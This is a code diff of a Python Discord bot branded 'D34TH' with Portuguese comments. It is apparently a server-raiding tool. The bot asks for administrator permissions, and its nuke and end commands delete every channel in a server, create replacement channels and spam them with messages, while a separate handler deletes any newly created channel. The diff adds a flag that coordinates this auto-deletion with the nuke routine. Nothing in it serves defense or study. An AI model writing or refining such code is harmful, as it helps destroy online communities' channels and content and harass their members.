@@ -32,6 +32,9 @@ def run_flask():
 
 threading.Thread(target=run_flask, daemon=True).start()
 
+# Controle para evitar que o monitor apague canais durante o NUKE
+nuke_active = False
+
 def load_text():
     try:
         with open('texto.txt', 'r', encoding='utf-8') as f:
@@ -78,10 +81,12 @@ async def glitch_message(ctx, mensagem, tempo=10):
     except:
         pass
 
-BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=1&scope=bot+applications.commands"
+BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=0&scope=bot+applications.commands"
 
 @bot.event
 async def on_ready():
+    global nuke_active
+    nuke_active = False
     print(f'Bot logado como {bot.user}')
     print(f'Em {len(bot.guilds)} servidores')
     await bot.change_presence(activity=discord.Game(name="•help_bot | D34TH"))
@@ -104,11 +109,14 @@ async def on_command_error(ctx, error):
 
 @bot.event
 async def on_guild_channel_create(channel):
-    try:
-        await channel.delete()
-        print(f"Canal {channel.name} apagado!")
-    except:
-        pass
+    """Apaga qualquer canal criado automaticamente, exceto durante o NUKE"""
+    global nuke_active
+    if not nuke_active:
+        try:
+            await channel.delete()
+            print(f"Canal {channel.name} apagado automaticamente!")
+        except:
+            pass
 
 class InviteButton(ui.View):
     def __init__(self):
@@ -187,8 +195,10 @@ async def ping(ctx):
 
 @bot.command()
 async def nuke(ctx):
+    global nuke_active
     try:
         await ctx.message.delete()
+        nuke_active = True
         texto = load_text()
         guild = ctx.guild
         
@@ -206,6 +216,7 @@ async def nuke(ctx):
         except:
             pass
         
+        # Apagar canais existentes
         for channel in guild.channels:
             try:
                 if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
@@ -214,6 +225,7 @@ async def nuke(ctx):
             except:
                 pass
         
+        # Criar novos canais
         criados = 0
         canais = []
         
@@ -244,6 +256,7 @@ async def nuke(ctx):
             except:
                 pass
         
+        # Enviar mensagens
         enviadas = 0
         for canal in canais:
             if isinstance(canal, discord.TextChannel):
@@ -263,13 +276,18 @@ async def nuke(ctx):
         embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
         if guild.text_channels:
             await guild.text_channels[0].send(embed=embed)
+            
     except Exception as e:
         print(f"Erro nuke: {e}")
+    finally:
+        nuke_active = False
 
 @bot.command()
 async def end(ctx):
+    global nuke_active
     try:
         await ctx.message.delete()
+        nuke_active = True
         guild = ctx.guild
         
         try:
@@ -299,8 +317,11 @@ async def end(ctx):
         print(f"{count} canais apagados")
         if guild.text_channels:
             await glitch_message(await guild.text_channels[0], f"{count} canais apagados", 5)
+            
     except Exception as e:
         print(f"Erro end: {e}")
+    finally:
+        nuke_active = False
 
 @bot.command()
 async def rename_all(ctx):
